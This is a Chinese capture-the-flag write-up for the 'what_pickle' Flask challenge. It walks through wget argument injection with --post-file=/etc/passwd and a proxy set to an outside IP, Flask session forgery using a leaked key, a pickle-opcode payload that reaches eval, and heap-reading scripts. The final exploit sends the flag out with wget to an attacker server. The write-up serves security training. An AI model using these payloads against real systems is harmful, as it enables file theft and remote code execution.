> 原文链接: https://www.anquanke.com//post/id/248899 


# 巅峰极客2021  what_pickle——一道综合性的python web


                                阅读量   
                                **37479**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t0126c0b0cd7585e1aa.png)](https://p3.ssl.qhimg.com/t0126c0b0cd7585e1aa.png)



## 前言

这题好像是最少人做出的web，考察的知识点比较多，综合性比较强，感觉挺有意思的。很多人都是卡在某个知识点，尤其是最后读flag阶段。总的来说，由于这题涉及到各种很经典的python安全的知识点，挺适合刚接触python安全的初学者学习。

总的来说，流程是这样的。

debug导致部分源码泄露-&gt;wget参数注入读源码-&gt;session伪造-&gt;pickle反序列化-&gt;利用proc目录/构造uaf读flag



## 分析

信息搜集一波。得到如下几个目录。

```
[01:33:40] 200 -    2KB - /console
[01:33:50] 500 -   14KB - /home
[01:33:51] 500 -   15KB - /images
[01:33:52] 200 -    1KB - /index
[01:33:56] 405 -  178B  - /login
```

值得注意的是home目录和images目录的http状态码为500

访问/home和images发现是python3的flask框架，且开了debug模式。那么想到，如果有任意读文件漏洞，可以打flask的pin。所以可以多关注一下任意读。



## 信息泄露

由于开了debug模式，所以有部分源码泄露。

在访问[http://192.168.37.140/images](http://192.168.37.140/images) 的时候，可以发现

[![](https://p0.ssl.qhimg.com/t01a94cf0bb0fcde7d8.png)](https://p0.ssl.qhimg.com/t01a94cf0bb0fcde7d8.png)

这段代码用wget去获取图片，并且还有可以控制的参数。获取到argv参数后，把argv参数作为一个list，其中，给每个argv参数前都添加了-或者—，以防止恶意url的注入。且subprocess.run时，command里面每一个元素都是单独作为一个参数，无法像bash shell那样做命令注入。



## wget参数注入读源码

虽然看似不行，还是有方法的，wget是可以开启代理的。如果开启代理，那么

具体来说有三种开启代理的方式：
1. 环境变量中设置http_proxy
1. 在~/.wgetrc里设置http_proxy
1. 使用-e参数执行wgetrc格式的命令
这里我们可以使用-e http_proxy=http://xxx 来将其指向我们的服务器上。

更多参数的详细信息可以参考

[Wgetrc Commands (GNU Wget 1.21.1-dirty Manual)](https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Commands.html)

除此之外，还可以用—post-file来传输文件传输文件。因此，任意文件读的payload就构建好了。如下

192.168.37.140/images?image=index.html&amp;argv=—post-file=/etc/passwd&amp;argv=-e http_proxy=http://1.116.123.136:1234

[![](https://p4.ssl.qhimg.com/t0170abe3a21acc1baf.png)](https://p4.ssl.qhimg.com/t0170abe3a21acc1baf.png)

接下来读源代码。

/app/app.py

```
from flask import Flask, request, session, render_template, url_for,redirect
import pickle
import io
import sys
import base64
import random
import subprocess
from ctypes import cdll
from config import SECRET_KEY, notadmin,user

cdll.LoadLibrary("./readflag.so")

app = Flask(__name__)
app.config.update(dict(
    SECRET_KEY=SECRET_KEY,
))

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module in ['config'] and "__" not in name:
            return getattr(sys.modules[module], name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))


def restricted_loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()


@app.route('/')
@app.route('/index')
def index():
    if session.get('username', None):
        return redirect(url_for('home'))
    else:
        return render_template('index.html')

@app.route('/login', methods=["POST"])
def login():
    name = request.form.get('username', '')
    data = request.form.get('data', 'test')
    User = user(name,data)
    session["info"]=base64.b64encode(pickle.dumps(User))
    return redirect(url_for('home'))

@app.route('/home')
def home():
    info = session["info"]
    User = restricted_loads(base64.b64decode(info))
    Jpg_id = random.randint(1,5)
    return render_template('home.html',id = str(Jpg_id), info = User.data)


@app.route('/images')
def images():
    command=["wget"]
    argv=request.args.getlist('argv')
    true_argv=[x if x.startswith("-") else '--'+x for x in argv]
    image=request.args['image']
    command.extend(true_argv)
    command.extend(["-q","-O","-"])
    command.append("http://127.0.0.1:8080/"+image)
    image_data = subprocess.run(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    return image_data.stdout



if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True, port=80)
```

/app/config.py

```
SECRET_KEY="On_You_fffffinddddd_thi3_kkkkkkeeEEy"

notadmin=`{`"admin":"no"`}`

class user():
    def __init__(self, username, data):
        self.username = username
        self.data = data

def backdoor(cmd):
    if isinstance(cmd,list) and notadmin["admin"]=="yes":
        s=''.join(cmd)
        eval(s)
```



## flask debug pin？

前面说了，开启了debug模式，那么配合任意文件读可以打pin，直接执行python命令。

flask的debug模式提供了一个web上的命令行接口。而这个接口是需要pin码才能访问的。

[![](https://p0.ssl.qhimg.com/t01d30bdf68629bac1a.png)](https://p0.ssl.qhimg.com/t01d30bdf68629bac1a.png)

这个pin码的生成与六个因素有关，其中最重要的是2个因素，一个是网卡地址，这个可以通过执行`uuid.getnode()`或者读`/sys/class/net/eth0/address`来获得。另一个 是机器id，可以通过执行`get_machine_id()`或者读`/etc/machine-id`来获得。

具体exp可以参考[https://xz.aliyun.com/t/2553](https://xz.aliyun.com/t/2553)

这里我本地环境下可以成功生成pin，但是远程环境没有成功。因此尝试下一条思路。



## session伪造触发pickle反序列化rce

关注到有`SECRET_KEY="On_You_fffffinddddd_thi3_kkkkkkeeEEy"`

而flask的session存在客户端，用base64+签名来防篡改。但是获取到签名算法的key后，我们有能力伪造flask session。

在home路由处触发session的pickle反序列化，而pickle反序列化是可以执行pickle的opcode的。

```
@app.route('/home')
def home():
    info = session["info"]
    User = restricted_loads(base64.b64decode(info))
    Jpg_id = random.randint(1,5)
    return render_template('home.html',id = str(Jpg_id), info = User.data)
```

关于pickle反序列化执行可以参考

[https://xz.aliyun.com/t/7436](https://xz.aliyun.com/t/7436)

```
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module in ['config'] and "__" not in name:
            return getattr(sys.modules[module], name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))


def restricted_loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()
```

这里限制了加载的模块只能为config里的，名字不能有__。但是可以通过config的backdoor函数，绕过。

```
def backdoor(cmd):
    if isinstance(cmd,list) and notadmin["admin"]=="yes":
        s=''.join(cmd)
        eval(s)
```

可以看到，要使用backdoor函数必须使得`notadmin["admin"]=="yes"`

而在config.py中`notadmin=`{`"admin":"no"`}``,因此需要通过pickle opcode把这个全局变量覆盖成yes。

### <a class="reference-link" name="%E8%AF%BBflag"></a>读flag

app.py里 有一个`cdll.LoadLibrary("./readflag.so")`

所以获取readflag.so，放到ida里反编译一下。

[![](https://p0.ssl.qhimg.com/t0165c9977d4dd03126.png)](https://p0.ssl.qhimg.com/t0165c9977d4dd03126.png)

可以看到就一个easy()函数。猜测flag文件没有直接读取的权限，要通过readflag.so来读。但是这里看有个问题是，easy函数执行完成后，把flag读到堆上，但是并没有返回指针。

这里有两种方法读flag。分别通过/proc目录和构造uaf的方式来读取堆上的flag。

#### <a class="reference-link" name="%E6%B3%951%EF%BC%9A%E8%AF%BBproc%E7%9B%AE%E5%BD%95"></a>法1：读proc目录

proc是linux伪文件系统，保存有内存信息。其中/proc/self/maps保存当前进程的虚拟内存各segment的映射关系。可以获取到堆地址的范围。

而访问/proc/self/mem即访问实际的进程内存。需要注意的是，如果访问没有被映射的内存区域则会触发错误，要把文件指针移到对应的区域才能成功访问。

具体代码如下

```
from ctypes import cdll
a=cdll.LoadLibrary("./readflag.so")
a.easy()

import re
f = open('/proc/self/maps', 'r') 
vmmap = f.read()
print(vmmap)
re_obj = re.search(r'(.*)-(.*) rw.*heap', vmmap)
heap = re_obj.group(1)
heap_end = re_obj.group(2)
print(heap)
print(heap_end)
heap = int('0x'+heap,16) 
heap_end = int('0x'+heap_end,16) 
f.close()

f = open('/proc/self/mem', 'rb') 
size = heap_end - heap
f.seek(heap)
res = f.read(size)
res = re.search(b'flag`{`.*`}`', res).group()
print(res)
f.close()
```

#### <a class="reference-link" name="%E6%B3%952%EF%BC%9A%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AAuaf%E6%9D%A5%E8%AF%BBflag%E7%9A%84%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE"></a>法2：构造一个uaf来读flag的内存数据

由于在堆管理中，为了提高效率会加一个类似于缓冲的机制。可以简单理解为不会把free的内存马上放弃掉，而是缓存起来，方便下次再用。利用这一特点可以构造uaf漏洞来读flag的数据。
1. 申请一个0x64的chunk，也就是后面存flag的那块chunk被malloc时需要的size。
1. free这块chunk。free后会这个chunk会放到fastbin或者tcache（glibc较高版本）里面。
1. 调easy()再次malloc申请就会申请到同一块chunk。再利用uaf漏洞，用之前的悬空指针读同一块chunk。
```
import ctypes
libc = ctypes.cdll.LoadLibrary('libc.so.6')
so1 = ctypes.cdll.LoadLibrary('./readflag.so')

malloc = libc.malloc
free = libc.free
malloc.restype = ctypes.c_void_p
ptr = ctypes.cast(malloc(0x64), ctypes.c_char_p) 
free(ptr)
so1.easy()
print(ptr.value)
```

### <a class="reference-link" name="opcode%E6%9E%84%E9%80%A0"></a>opcode构造

知道pickle opcode工作模式后可以利用大师傅写的一个工具

[https://github.com/eddieivan01/pker](https://github.com/eddieivan01/pker)



## 最终exp

通过wget 把flag信息传送到服务器上。这里利用的是uaf的方法读flag。proc读flag的方法构造exp过程完全一样。

```
from base64 import b64encode
from flask import Flask, request, session
from flask.sessions import SecureCookieSessionInterface
import pickle 
import requests


opc = b'cconfig\nnotadmin\np0\n0cconfig\nbackdoor\np1\n0g0\nS\'admin\'\nS\'yes\'\nsS\'exec("import ctypes;libc = ctypes.cdll.LoadLibrary(\\\'libc.so.6\\\');so1 = ctypes.cdll.LoadLibrary(\\\'./readflag.so\\\');malloc = libc.malloc;free = libc.free;malloc.restype = ctypes.c_void_p;a = ctypes.cast(malloc(0x64), ctypes.c_char_p);free(a);so1.easy();print(a.value);res= a.value ;import os;os.system(\\\'wget http://1.116.123.136:1234/?\\\'+str(res))")\'\np3\n0g1\n((g3\nltR.'

app = Flask(__name__) 
app.config['SECRET_KEY'] = "On_You_fffffinddddd_thi3_kkkkkkeeEEy"
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
opc = b64encode(opc)
sess = `{`'info': opc`}`
cookie = serializer.dumps(sess)
print(cookie)
requests.get("http://192.168.37.140/home", cookies=`{`"session":cookie`}`)
```

可以看到get参数就是flag`{`dddd`}`

[![](https://p2.ssl.qhimg.com/t011193b9d157f02b99.png)](https://p2.ssl.qhimg.com/t011193b9d157f02b99.png)



## 总结

可以看到这个题目涉及到的python安全的点很多，非常适合通过这题来延伸学习各个具体的内容。另外，在做题过程中，经常会碰到各种坑，有时候踩坑也可以换一种思路。
